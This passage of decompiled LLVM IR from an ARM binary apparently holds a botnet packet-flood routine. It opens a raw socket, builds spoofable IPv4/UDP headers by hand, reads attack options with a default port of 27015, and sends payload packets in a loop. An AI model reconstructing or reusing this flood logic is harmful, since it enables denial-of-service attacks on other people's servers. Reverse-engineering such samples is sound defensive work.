  %v3_e4d8 = add i32 %v2_e4d8, 20
  %v4_e4d8 = inttoptr i32 %v3_e4d8 to i8*
  store i8 %v1_e4d8, i8* %v4_e4d8, align 1
  %v0_e4dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e4dc = trunc i32 %v0_e4dc to i8
  %v2_e4dc = load i32, i32* %r0.global-to-local, align 4
  %v3_e4dc = add i32 %v2_e4dc, 5
  %v4_e4dc = inttoptr i32 %v3_e4dc to i8*
  store i8 %v1_e4dc, i8* %v4_e4dc, align 1
  %v0_e4e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e4e0 = trunc i32 %v0_e4e0 to i8
  %v2_e4e0 = load i32, i32* %r0.global-to-local, align 4
  %v3_e4e0 = add i32 %v2_e4e0, 1
  %v4_e4e0 = inttoptr i32 %v3_e4e0 to i8*
  store i8 %v1_e4e0, i8* %v4_e4e0, align 1
  %v0_e4e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_e4e4 = trunc i32 %v0_e4e4 to i8
  %v2_e4e4 = load i32, i32* %r0.global-to-local, align 4
  %v3_e4e4 = add i32 %v2_e4e4, 2
  %v4_e4e4 = inttoptr i32 %v3_e4e4 to i8*
  store i8 %v1_e4e4, i8* %v4_e4e4, align 1
  store i32 %v4_e4e8, i32* %r1.global-to-local, align 4
  %v0_e4ec = load i32, i32* %r6.global-to-local, align 4
  %v1_e4ec = load i32, i32* @sl, align 4
  %v9_e4ec = icmp eq i32 %v0_e4ec, %v1_e4ec
  store i1 %v9_e4ec, i1* %cpsr_z.global-to-local, align 1
  %v2_e4f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_e4f0 = add i32 %v2_e4f0, 3
  %v4_e4f0 = inttoptr i32 %v3_e4f0 to i8*
  store i8 %v1_e4f0, i8* %v4_e4f0, align 1
  %v0_e4f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_e4f4 = trunc i32 %v0_e4f4 to i8
  %v2_e4f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_e4f4 = add i32 %v2_e4f4, 4
  %v4_e4f4 = inttoptr i32 %v3_e4f4 to i8*
  store i8 %v1_e4f4, i8* %v4_e4f4, align 1
  %v0_e4f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e4f8, i32* %stack_var_-40, align 4
  %v5_e4fc = icmp slt i32 %v0_e4ec, %v1_e4ec
  br i1 %v5_e4fc, label %dec_label_pc_e420, label %dec_label_pc_e1c0

; uselistorder directives
  uselistorder i32 %v1_e488, { 1, 0 }
  uselistorder i32 %v3_e3f8, { 2, 1, 0 }
  uselistorder i32 %v3_e3f4, { 1, 0 }
  uselistorder i32 %v7_e3f0, { 1, 0 }
  uselistorder i32 %v4_e3b8, { 1, 0 }
  uselistorder i32 %v0_e3b0, { 0, 2, 1 }
  uselistorder i32 %v0_e394, { 0, 2, 1 }
  uselistorder i32 %v4_e380, { 1, 0 }
  uselistorder i32 %v0_e378, { 0, 2, 1 }
  uselistorder i32 %v2_e34c, { 1, 0 }
  uselistorder i32 %v8_e32c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_e318, { 1, 0 }
  uselistorder i32 %v3_e2f4, { 1, 3, 2, 0, 4 }
  uselistorder i1 %v2_e2e8, { 1, 0 }
  uselistorder i32 %v1_e2dc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e2d8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e280, { 0, 2, 1 }
  uselistorder i32 %v0_e268, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e254, { 1, 0 }
  uselistorder i32 %v2_e250, { 0, 2, 1 }
  uselistorder i1 %v7_e200, { 2, 1, 0 }
  uselistorder i1 %v3_e36c, { 1, 0, 2, 3 }
  uselistorder i8 %v5_e0b0, { 0, 2, 1 }
  uselistorder i32 %v3_e09c, { 1, 0 }
  uselistorder i32 %v1_e08c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_e088, { 1, 2, 0 }
  uselistorder i32 %v1_e080, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v1_e078, { 1, 0 }
  uselistorder i32 %v1_e050, { 2, 1, 0, 3 }
  uselistorder i32 %v3_e030, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_e010, { 2, 1, 4, 3, 0 }
  uselistorder i32 %v0_e00c, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_e008, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_dffc, { 3, 1, 2, 0 }
  uselistorder i1 %v7_dfe8, { 1, 0 }
  uselistorder i1 %v7_dfbc, { 1, 0 }
  uselistorder i32 %v3_dfb8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_dfa4, { 2, 1, 7, 5, 0, 6, 4, 3 }
  uselistorder i32 %v1_df90, { 3, 1, 2, 0 }
  uselistorder i32 %v1_df1c, { 1, 0 }
  uselistorder i8 %v5_df0c, { 1, 0, 2 }
  uselistorder i32 %v5_def0, { 1, 0 }
  uselistorder i8 %v5_ded4, { 0, 2, 1 }
  uselistorder i32 %v6_deb4, { 1, 0 }
  uselistorder i32 %v4_de9c, { 0, 3, 1, 5, 2, 4 }
  uselistorder i32 %v1_de80, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 48, 47, 49, 50, 52, 51, 54, 53, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 12, 11, 14, 13, 15, 16, 17, 19, 18, 21, 20, 22, 24, 23, 30, 25, 26, 27, 28, 29, 35, 31, 32, 33, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i8*)* @function_10d44, { 0, 1, 2, 7, 3, 4, 5, 6 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_e3e4, { 1, 0 }
  uselistorder label %dec_label_pc_e3cc, { 1, 0 }
  uselistorder label %dec_label_pc_e240, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e1c8, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
}

define i32 @function_e508(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e508:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e508 = load i32, i32* @r4, align 4
  %v6_e508 = load i32, i32* @r5, align 4
  %v9_e508 = load i32, i32* @r6, align 4
  %v12_e508 = load i32, i32* @r7, align 4
  %v1_e50c = urem i32 %arg1, 256
  store i32 %v1_e50c, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_e520 = urem i32 %arg3, 256
  store i32 %v1_e520, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_e528 = call i32* @calloc(i32 %v1_e50c, i32 4)
  %v4_e528 = ptrtoint i32* %v2_e528 to i32
  %v0_e52c = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_e538 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_e540 = inttoptr i32 %v0_e52c to i32*
  %v6_e540 = call i32 @function_b240(i32 %v0_e538, i32* %v5_e540, i32 2, i32 0)
  %v1_e54c = urem i32 %v6_e540, 256
  store i32 %v1_e54c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_e558 = load i32, i32* @r4, align 4
  %v0_e55c = load i32, i32* @r5, align 4
  %v5_e560 = trunc i32 %v6_e540 to i8
  %v6_e564 = inttoptr i32 %v0_e55c to i32*
  %v7_e564 = call i32 @function_b240(i32 %v0_e558, i32* %v6_e564, i32 3, i32 65535)
  %v0_e568 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_e564, i32* @r7, align 4
  %v0_e578 = load i32, i32* @r4, align 4
  %v4_e57c = inttoptr i32 %v0_e568 to i32*
  %v5_e57c = call i32 @function_b240(i32 %v0_e578, i32* %v4_e57c, i32 4, i32 64)
  %v1_e584 = urem i32 %v5_e57c, 256
  store i32 %v1_e584, i32* %ip.global-to-local, align 4
  %v0_e588 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_e594 = load i32, i32* @r4, align 4
  %v5_e598 = trunc i32 %v5_e57c to i8
  %v6_e59c = inttoptr i32 %v0_e588 to i32*
  %v7_e59c = call i32 @function_b240(i32 %v0_e594, i32* %v6_e59c, i32 5, i32 0)
  %v1_e5a8 = urem i32 %v7_e59c, 256
  store i32 %v1_e5a8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_e5b4 = load i32, i32* @r4, align 4
  %v0_e5b8 = load i32, i32* @r5, align 4
  %v5_e5c0 = inttoptr i32 %v0_e5b8 to i32*
  %v6_e5c0 = call i32 @function_b240(i32 %v0_e5b4, i32* %v5_e5c0, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_e5d0 = load i32, i32* @r5, align 4
  store i32 %v6_e5c0, i32* @r6, align 4
  %v0_e5d8 = load i32, i32* @r4, align 4
  %v4_e5dc = inttoptr i32 %v0_e5d0 to i32*
  %v5_e5dc = call i32 @function_b240(i32 %v0_e5d8, i32* %v4_e5dc, i32 7, i32 27015)
  store i32 %v5_e5dc, i32* @r4, align 4
  %v1_e5e8 = call i32 @function_13074(i32 29)
  %v3_e5f4 = call i32 @function_12f90(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_e5f4, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_e608 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_e60c = icmp eq i32 %v3_e608, -1
  store i1 %v7_e60c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e608, i32* %fp.global-to-local, align 4
  br i1 %v7_e60c, label %dec_label_pc_e9c0, label %dec_label_pc_e618

dec_label_pc_e618:                                ; preds = %dec_label_pc_e508
  store i32 1, i32* %stack_var_-40, align 4
  %v6_e620 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_e620, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_e634 = call i32 @setsockopt(i32 0, i32 3, i32 %v6_e620, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_e638 = icmp eq i32 %v6_e634, -1
  store i1 %v7_e638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e638, label %dec_label_pc_e9b8, label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %dec_label_pc_e618
  %v0_e640 = load i32, i32* @r4, align 4
  %v3_e640 = mul i32 %v0_e640, 65536
  store i32 %v3_e640, i32* %lr.global-to-local, align 4
  %v0_e644 = load i32, i32* @r7, align 4
  %v0_e648 = load i32, i32* @r6, align 4
  %v3_e648 = mul i32 %v0_e648, 65536
  store i32 %v3_e648, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_e650 = urem i32 %v0_e644, 65536
  %v3_e654 = urem i32 %v0_e648, 65536
  store i32 %v3_e654, i32* %r2.global-to-local, align 4
  %v3_e658 = urem i32 %v0_e640, 65536
  store i32 %v3_e658, i32* %r3.global-to-local, align 4
  %v0_e65c = load i32, i32* %sb.global-to-local, align 4
  %v2_e65c = icmp eq i32 %v0_e65c, 0
  store i1 %v2_e65c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp51 = icmp slt i32 %v0_e65c, 1
  br i1 %tmp51, label %dec_label_pc_e7e0, label %dec_label_pc_e674

dec_label_pc_e674:                                ; preds = %dec_label_pc_e640
  %v1_e678 = urem i32 %v0_e640, 256
  %v1_e67c = urem i32 %v0_e644, 256
  %v3_e680 = mul nuw nsw i32 %v1_e678, 256
  %v1_e684 = urem i32 %v0_e648, 256
  %tmp52 = udiv i32 %v0_e644, 256
  %v3_e688 = urem i32 %tmp52, 256
  %tmp53 = udiv i32 %v0_e648, 256
  %v3_e68c = urem i32 %tmp53, 256
  store i32 %v3_e68c, i32* %ip.global-to-local, align 4
  %v4_e690 = mul nuw nsw i32 %v1_e67c, 256
  %v5_e690 = or i32 %v4_e690, %v3_e688
  store i32 %v5_e690, i32* %r7.global-to-local, align 4
  %v4_e694 = mul nuw nsw i32 %v1_e684, 256
  %v5_e694 = or i32 %v4_e694, %v3_e68c
  store i32 %v5_e694, i32* %r6.global-to-local, align 4
  %tmp54 = udiv i32 %v0_e640, 256
  %v4_e698 = urem i32 %tmp54, 256
  %v5_e698 = or i32 %v4_e698, %v3_e680
  store i32 %v5_e698, i32* %r5.global-to-local, align 4
  store i32 %v1_e684, i32* %r2.global-to-local, align 4
  store i32 %v1_e678, i32* %r3.global-to-local, align 4
  %v2_e714 = icmp eq i32 %v1_e5a8, 0
  %v4_e718 = sext i8 %v5_e598 to i32
  %sext = mul i32 %v0_e644, 16777216
  %v4_e734 = sdiv i32 %sext, 16777216
  %sext7 = mul i32 %v0_e648, 16777216
  %v4_e790 = sdiv i32 %sext7, 16777216
  %sext8 = mul i32 %v0_e640, 16777216
  %v4_e7b0 = sdiv i32 %sext8, 16777216
  br label %dec_label_pc_e6b4

dec_label_pc_e6b4:                                ; preds = %bb58, %dec_label_pc_e674
  %v2_e6bc = call i32* @calloc(i32 128, i32 1)
  %v4_e6bc = ptrtoint i32* %v2_e6bc to i32
  store i32 %v4_e528, i32* %r2.global-to-local, align 4
  %v3_e6c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e6c4, i32* %r3.global-to-local, align 4
  %v2_e6c8 = load i32, i32* @r4, align 4
  %v5_e6c8 = mul i32 %v2_e6c8, 4
  %v6_e6c8 = add i32 %v5_e6c8, %v4_e528
  %v7_e6c8 = inttoptr i32 %v6_e6c8 to i32*
  store i32 %v4_e6bc, i32* %v7_e6c8, align 4
  %v0_e6cc = load i32, i32* %r2.global-to-local, align 4
  %v1_e6cc = load i32, i32* %r3.global-to-local, align 4
  %v4_e6cc = mul i32 %v1_e6cc, 4
  %v5_e6cc = add i32 %v4_e6cc, %v0_e6cc
  %v6_e6cc = inttoptr i32 %v5_e6cc to i32*
  %v7_e6cc = load i32, i32* %v6_e6cc, align 4
  store i32 %v7_e6cc, i32* %lr.global-to-local, align 4
  %v1_e6d0 = inttoptr i32 %v7_e6cc to i8*
  %v2_e6d0 = load i8, i8* %v1_e6d0, align 1
  %tmp = urem i8 %v2_e6d0, 16
  %v1_e6d4 = zext i8 %tmp to i32
  %v1_e6d8 = or i32 %v1_e6d4, 64
  store i32 %v1_e6d8, i32* %r3.global-to-local, align 4
  %v1_e6dc = trunc i32 %v1_e6d8 to i8
  store i8 %v1_e6dc, i8* %v1_e6d0, align 1
  %v0_e6e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e6e0 = inttoptr i32 %v0_e6e0 to i8*
  %v2_e6e0 = load i8, i8* %v1_e6e0, align 1
  %v1_e6e4 = and i8 %v2_e6e0, -16
  %v1_e6e8 = or i8 %v1_e6e4, 5
  store i8 %v1_e6e8, i8* %v1_e6e0, align 1
  %v2_e6f4 = load i32, i32* %lr.global-to-local, align 4
  %v3_e6f4 = add i32 %v2_e6f4, 1
  %v4_e6f4 = inttoptr i32 %v3_e6f4 to i8*
  store i8 %v5_e560, i8* %v4_e6f4, align 1
  %v3_e6f8 = load i32, i32* %stack_var_-44, align 4
  %v1_e6fc = add i32 %v3_e6f8, 32
  %tmp55 = mul i32 %v1_e6fc, 256
  %v1_e708 = and i32 %tmp55, 65280
  %tmp56 = udiv i32 %v1_e6fc, 256
  %v4_e70c = urem i32 %tmp56, 256
  %v5_e70c = or i32 %v4_e70c, %v1_e708
  store i32 %v5_e70c, i32* %r2.global-to-local, align 4
  store i1 %v2_e714, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_e718, i32* %r3.global-to-local, align 4
  %v2_e71c = load i32, i32* %lr.global-to-local, align 4
  %v3_e71c = add i32 %v2_e71c, 8
  %v4_e71c = inttoptr i32 %v3_e71c to i8*
  store i8 %v5_e598, i8* %v4_e71c, align 1
  %v0_e720 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e720, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e6b4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e724 = load i32, i32* %lr.global-to-local, align 4
  %v4_e724 = add i32 %v3_e724, 6
  %v5_e724 = inttoptr i32 %v4_e724 to i8*
  store i8 64, i8* %v5_e724, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e6b4, %bb
  %v0_e728 = load i32, i32* %r2.global-to-local, align 4
  %v1_e728 = trunc i32 %v0_e728 to i8
  %v2_e728 = load i32, i32* %lr.global-to-local, align 4
  %v3_e728 = add i32 %v2_e728, 2
  %v4_e728 = inttoptr i32 %v3_e728 to i8*
  store i8 %v1_e728, i8* %v4_e728, align 1
  %v0_e72c = load i32, i32* %r2.global-to-local, align 4
  %v3_e72c = sdiv i32 %v0_e72c, 256
  store i32 %v3_e72c, i32* %ip.global-to-local, align 4
  store i32 %v4_e734, i32* %r2.global-to-local, align 4
  %v2_e738 = load i32, i32* %lr.global-to-local, align 4
  %v3_e738 = add i32 %v2_e738, 9
  %v4_e738 = inttoptr i32 %v3_e738 to i8*
  store i8 17, i8* %v4_e738, align 1
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* %r3.global-to-local, align 4
  %v0_e740 = load i32, i32* %r2.global-to-local, align 4
  %v1_e740 = trunc i32 %v0_e740 to i8
  %v2_e740 = load i32, i32* %lr.global-to-local, align 4
  %v3_e740 = add i32 %v2_e740, 5
  %v4_e740 = inttoptr i32 %v3_e740 to i8*
  store i8 %v1_e740, i8* %v4_e740, align 1
  %v0_e744 = load i32, i32* %ip.global-to-local, align 4
  %v1_e744 = trunc i32 %v0_e744 to i8
  %v2_e744 = load i32, i32* %lr.global-to-local, align 4
  %v3_e744 = add i32 %v2_e744, 3
  %v4_e744 = inttoptr i32 %v3_e744 to i8*
  store i8 %v1_e744, i8* %v4_e744, align 1
  %v0_e748 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e748, label %.thread9, label %bb57

.thread9:                                         ; preds = %.thread
  %v3_e74c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e74c10, i32* %ip.global-to-local, align 4
  br label %bb58

bb57:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e74c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e74c, i32* %ip.global-to-local, align 4
  %v3_e750 = load i32, i32* %lr.global-to-local, align 4
  %v4_e750 = add i32 %v3_e750, 7
  %v5_e750 = inttoptr i32 %v4_e750 to i8*
  store i8 0, i8* %v5_e750, align 1
  %v0_e758.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %bb57
  %v0_e758 = phi i32 [ %v3_e74c10, %.thread9 ], [ %v0_e758.pre, %bb57 ]
  %v2_e754 = load i32, i32* @global_var_1cd48.140, align 4
  store i32 %v2_e754, i32* %r2.global-to-local, align 4
  %v3_e758 = mul i32 %v0_e758, 32
  store i32 %v3_e758, i32* %r3.global-to-local, align 4
  %v1_e75c = load i32, i32* %lr.global-to-local, align 4
  %v2_e75c = add i32 %v1_e75c, 12
  %v3_e75c = inttoptr i32 %v2_e75c to i32*
  store i32 %v2_e754, i32* %v3_e75c, align 4
  %v0_e760 = load i32, i32* %r3.global-to-local, align 4
  %v1_e760 = load i32, i32* %ip.global-to-local, align 4
  %tmp61 = mul i32 %v1_e760, -8
  %v5_e760 = add i32 %v0_e760, %tmp61
  %v1_e764 = load i32, i32* @sl, align 4
  %v2_e764 = add i32 %v5_e760, %v1_e764
  store i32 %v2_e764, i32* %r3.global-to-local, align 4
  %v1_e768 = add i32 %v2_e764, 16
  %v2_e768 = inttoptr i32 %v1_e768 to i32*
  %v3_e768 = load i32, i32* %v2_e768, align 4
  %v1_e76c = load i32, i32* %lr.global-to-local, align 4
  %v2_e76c = add i32 %v1_e76c, 16
  %v3_e76c = inttoptr i32 %v2_e76c to i32*
  store i32 %v3_e768, i32* %v3_e76c, align 4
  %v3_e770 = load i32, i32* %stack_var_-44, align 4
  %v1_e774 = add i32 %v3_e770, 12
  %tmp59 = mul i32 %v1_e774, 256
  %v1_e784 = and i32 %tmp59, 65280
  %tmp60 = udiv i32 %v1_e774, 256
  %v4_e788 = urem i32 %tmp60, 256
  %v5_e788 = or i32 %v4_e788, %v1_e784
  store i32 %v5_e788, i32* %ip.global-to-local, align 4
  %v1_e78c = load i32, i32* %lr.global-to-local, align 4
  %v2_e78c = add i32 %v1_e78c, 28
  %v3_e78c = inttoptr i32 %v2_e78c to i32*
  store i32 -1, i32* %v3_e78c, align 4
  store i32 %v4_e790, i32* %r2.global-to-local, align 4
  %v0_e794 = load i32, i32* %lr.global-to-local, align 4
  %v1_e794 = add i32 %v0_e794, 20
  store i32 %v1_e794, i32* %r4.global-to-local, align 4
  %v0_e798 = load i32, i32* %ip.global-to-local, align 4
  %v3_e798 = sdiv i32 %v0_e798, 256
  store i32 %v3_e798, i32* %r3.global-to-local, align 4
  %v0_e79c = load i32, i32* %r7.global-to-local, align 4
  %v1_e79c = trunc i32 %v0_e79c to i8
  %v3_e79c = add i32 %v0_e794, 4
  %v4_e79c = inttoptr i32 %v3_e79c to i8*
  store i8 %v1_e79c, i8* %v4_e79c, align 1
  %v0_e7a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_e7a0 = trunc i32 %v0_e7a0 to i8
  %v2_e7a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_e7a0 = add i32 %v2_e7a0, 20
  %v4_e7a0 = inttoptr i32 %v3_e7a0 to i8*
  store i8 %v1_e7a0, i8* %v4_e7a0, align 1
  %v0_e7a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7a4 = trunc i32 %v0_e7a4 to i8
  %v2_e7a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7a4 = add i32 %v2_e7a4, 5
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i8*
  store i8 %v1_e7a4, i8* %v4_e7a4, align 1
  %v0_e7a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_e7a8 = trunc i32 %v0_e7a8 to i8
  %v2_e7a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7a8 = add i32 %v2_e7a8, 2
  %v4_e7a8 = inttoptr i32 %v3_e7a8 to i8*
  store i8 %v1_e7a8, i8* %v4_e7a8, align 1
  %v0_e7ac = load i32, i32* %r2.global-to-local, align 4
  %v1_e7ac = trunc i32 %v0_e7ac to i8
  %v2_e7ac = load i32, i32* %r4.global-to-local, align 4
  %v3_e7ac = add i32 %v2_e7ac, 1
  %v4_e7ac = inttoptr i32 %v3_e7ac to i8*
  store i8 %v1_e7ac, i8* %v4_e7ac, align 1
  store i32 %v4_e7b0, i32* %r3.global-to-local, align 4
  %v0_e7b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e7b4 = trunc i32 %v0_e7b4 to i8
  %v2_e7b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7b4 = add i32 %v2_e7b4, 4
  %v4_e7b4 = inttoptr i32 %v3_e7b4 to i8*
  store i8 %v1_e7b4, i8* %v4_e7b4, align 1
  %v0_e7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e7b8 = trunc i32 %v0_e7b8 to i8
  %v2_e7b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_e7b8 = add i32 %v2_e7b8, 3
  %v4_e7b8 = inttoptr i32 %v3_e7b8 to i8*
  store i8 %v1_e7b8, i8* %v4_e7b8, align 1
  %v0_e7bc = load i32, i32* %r8.global-to-local, align 4
  %v0_e7c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e7c0 = add i32 %v0_e7c0, 32
  %v3_e7c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e7c4, i32* %r2.global-to-local, align 4
  %v3_e7c8 = call i32 @function_13a18(i32 %v1_e7c0, i32 %v0_e7bc, i32 %v3_e7c4)
  %v3_e7cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e7cc, i32* %r3.global-to-local, align 4
  %v1_e7d0 = add i32 %v3_e7cc, 1
  store i32 %v1_e7d0, i32* @r4, align 4
  %v1_e7d4 = load i32, i32* %sb.global-to-local, align 4
  %v9_e7d4 = icmp eq i32 %v1_e7d0, %v1_e7d4
  store i1 %v9_e7d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e7d0, i32* %stack_var_-40, align 4
  %v5_e7dc = icmp slt i32 %v1_e7d0, %v1_e7d4
  br i1 %v5_e7dc, label %dec_label_pc_e6b4, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %bb58, %dec_label_pc_e640
  %v0_e7e0 = phi i32 [ %v0_e65c, %dec_label_pc_e640 ], [ %v1_e7d4, %bb58 ]
  %v2_e7e0 = icmp eq i32 %v0_e7e0, 0
  store i1 %v2_e7e0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e828 = icmp eq i32 %v3_e650, 65535
  br label %dec_label_pc_e7e8.outer

dec_label_pc_e7e8.outer:                          ; preds = %dec_label_pc_e8f8, %dec_label_pc_e7e0
  %v1_e7e8.ph.in = phi i32 [ %v1_e8ec, %dec_label_pc_e8f8 ], [ %v0_e7e0, %dec_label_pc_e7e0 ]
  %v0_e7e8.ph = phi i1 [ %v2_e8f8, %dec_label_pc_e8f8 ], [ %v2_e7e0, %dec_label_pc_e7e0 ]
  %v1_e7e8.ph = icmp slt i32 %v1_e7e8.ph.in, 0
  %v4_e7e8 = or i1 %v1_e7e8.ph, %v0_e7e8.ph
  br label %dec_label_pc_e7e8

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e7e8.outer, %dec_label_pc_e7e8
  br i1 %v4_e7e8, label %dec_label_pc_e7e8, label %dec_label_pc_e7ec

dec_label_pc_e7ec:                                ; preds = %dec_label_pc_e7e8
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e7f8

dec_label_pc_e7f8:                                ; preds = %dec_label_pc_e848, %dec_label_pc_e7ec
  %v1_e80c = phi i32 [ %v1_e8e8, %dec_label_pc_e848 ], [ 0, %dec_label_pc_e7ec ]
  %v5_e7fc = mul i32 %v1_e80c, 24
  %v1_e800 = load i32, i32* @sl, align 4
  %v2_e800 = add i32 %v1_e800, %v5_e7fc
  store i32 %v2_e800, i32* %r3.global-to-local, align 4
  %v1_e808 = add i32 %v2_e800, 20
  %v2_e808 = inttoptr i32 %v1_e808 to i8*
  %v3_e808 = load i8, i8* %v2_e808, align 1
  %v4_e808 = zext i8 %v3_e808 to i32
  store i32 %v4_e808, i32* %r2.global-to-local, align 4
  %v4_e80c = mul i32 %v1_e80c, 4
  %v5_e80c = add i32 %v4_e80c, %v4_e528
  %v6_e80c = inttoptr i32 %v5_e80c to i32*
  %v7_e80c = load i32, i32* %v6_e80c, align 4
  store i32 %v7_e80c, i32* @r5, align 4
  %v7_e814 = icmp eq i8 %v3_e808, 31
  store i1 %v7_e814, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_e81c = add i32 %v7_e80c, 20
  store i32 %v1_e81c, i32* @r6, align 4
